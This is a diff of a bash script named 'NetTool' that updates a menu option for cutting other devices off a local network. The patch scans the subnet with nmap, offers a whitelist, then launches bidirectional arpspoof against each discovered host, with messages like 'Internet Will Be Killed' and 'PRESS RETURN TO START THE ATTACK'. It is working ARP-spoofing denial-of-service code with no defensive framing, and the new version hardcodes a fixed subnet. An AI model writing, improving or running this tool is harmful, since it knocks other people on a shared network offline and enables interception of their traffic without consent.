@@ -50,15 +50,15 @@ do
     #Menu
     echo -e "               \e[1;31m -- NetTool -- \e[0m         "
     echo ""
-    echo -e "              \e[0;34mVersion : 1.0\e[0m         "
+    echo -e "              \e[0;34mVersion : 2.0\e[0m         "
     echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
-    echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
+    echo -e "              \e[0;34mEmail   : montasilinigamer@gmail.com\e[0m         "
     
     echo ""
 
     interface=$(route | grep '^default' | grep -o '[^ ]*$')
     ip=$(ifconfig $interface | grep -w inet | cut -d" " -f10)
-    gateway=$(netstat -rn | grep '^\(default\|0\.0\.0\.0\)' | awk '{print $2}')
+    gateway=$(ip route show default | awk '/default/ {print $3}')
     net_range=$(ip a l $interface | awk '/inet.*brd/ {split($2,add,"/");split(add[1],ip,".");if(add[2]<=24){ip[4]=0} if(add[2]<=16){ip[3]=0} if(add[2]<=8){ip[2]=0} print ip[1]"."ip[2]"."ip[3]"."ip[4]"/"add[2];}')
     echo -e ""$orange""Interface:$nc" $interface | "$orange""Gateway:$nc" $gateway"
     echo "------------------------------------------------"
@@ -232,9 +232,9 @@ do
                     pkill arpspoof
                     echo -e "$blue""Going back to Menu...$nc"
                     sleep 1
+                    clear
                     ;;
                 3)  
-                    clear
                     while [ true ]; do
                         echo -e "$yellow""Scanning for devices$nc"
                         sleep 0.1
@@ -249,12 +249,18 @@ do
                         sleep 0.1
                         clear
                     done & 
-                    trap 'kill $!' SIGTERM SIGKILL
-                    nmap -n -sn $net_range -oG - | awk '/Up$/{print $2}' | sort -V > scan.txt
                     clear
-                    echo -e "$red""Killing Internet Connection for the following devices! $nc"
-                    sudo tail +2 scan.txt
+                    trap 'kill $!' SIGTERM SIGKILL
+                    nmap -n -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' | sort -V > scan.txt
                     kill $!
+                    sleep 0.2
+                    clear
+                    echo -e "$red""Internet Will Be Killed for the following devices! $nc"
+                    echo ""
+                    sed -i '1d' scan.txt </dev/null &>/dev/null
+                    grep -v "$ip" scan.txt > temp && mv temp scan.txt  
+                    cat scan.txt
+                    echo ""
                     echo -n "Do you want to whitelist some IPs? (y/n) "
                     read answ5
                     if [ "$answ5" == "y"  ] || [ "$answ5" == "Y"  ]; then 
@@ -262,38 +268,9 @@ do
                         read ip_whl
                         echo "IP to whitelist : $ip_whl "
                         grep -v "$ip_whl" scan.txt > temp && mv temp scan.txt
-                        echo -e "\e[1;33mPress RETURN To Proceed! \c\e[0m"
+                        echo -e "\e[1;33mPRESS RETURN TO START THE ATTACK! \c\e[0m"
                         read input
-                    while IFS= read -r line; do
-                        # The 'declare' syntax creates variables on the fly with the values
-                        # read from the file
-                        declare target$((i++))="$line"
-                    done <scan.txt
-                    count="$((i-1))"
-                    # Now the variables are created; those can be individually accessed as  
-                    # '$target1'..'$tatgetN'; but to print it on a loop, use
-                    # indirect expansion using ${!var} syntax 
-                    clear 
-                    echo -e "$orange""Starting Attack...$nc"
-                    sleep 0.3
-                    for ((idx=1; idx<=count; idx++)); do
-                        temp=target$idx
-                        trgt="$target""${!temp}"
-                        echo -e  "$lightblue""killing$nc" "$red""$trgt $nc"  
-                        sleep 0.5 
-                        nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
-                        nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
-                        sleep 1
-                    done
-                    echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
-                    read input
-                    pkill arpspoof
-                    sudo rm scan.txt
-                    echo -e "$blue""Going back to Menu...$nc"
-                    sleep 1
-                    else
-                        echo -e "\e[1;33mPress RETURN To Proceed! \c\e[0m"
-                        read input
+                        i=0
                         while IFS= read -r line; do
                             # The 'declare' syntax creates variables on the fly with the values
                             # read from the file
@@ -306,19 +283,48 @@ do
                         clear 
                         echo -e "$orange""Starting Attack...$nc"
                         sleep 0.3
-                        for ((idx=1; idx<=count; idx++)); do
+                        for ((idx=0; idx<=count; idx++)); do
                             temp=target$idx
                             trgt="$target""${!temp}"
-                            echo -e  "$lightblue""killing$nc" "$red""$trgt $nc"  
+                            echo -e  "$lightblue""Killing$nc" "$red""$trgt $nc"  
+                            sleep 0.5 
+                            nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
+                            nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
+                            sleep 1
+                        done
+                        echo -e "\e[1;32mPRESS RETURN TO CANCLE \c\e[0m"
+                        read input
+                        pkill arpspoof
+                        rm scan.txt
+                        echo -e "$blue""Going back to Menu...$nc"
+                        sleep 1
+                    else
+                    i=0
+                        while IFS= read -r line; do
+                            # The 'declare' syntax creates variables on the fly with the values
+                            # read from the file
+                            declare target$((i++))="$line"
+                        done <scan.txt
+                        count="$((i-1))"
+                        # Now the variables are created; those can be individually accessed as  
+                        # '$target1'..'$tatgetN'; but to print it on a loop, use
+                        # indirect expansion using ${!var} syntax 
+                        clear 
+                        echo -e "$orange""Starting Attack...$nc"
+                        sleep 0.3
+                        for ((idx=0; idx<=count; idx++)); do
+                            temp=target$idx
+                            trgt="$target""${!temp}"
+                            echo -e  "$lightblue""Killing$nc" "$red""$trgt $nc"  
                             sleep 0.5 
                             nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
                             nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                             sleep 1
                         done 
-                        echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                        echo -e "\e[1;32mPRESS RETURN TO CANCLE \c\e[0m"
                         read input
                         pkill arpspoof
-                        sudo rm scan.txt
+                        rm scan.txt
                         echo -e "$blue""Going back to Menu...$nc"
                         sleep 1
                     fi
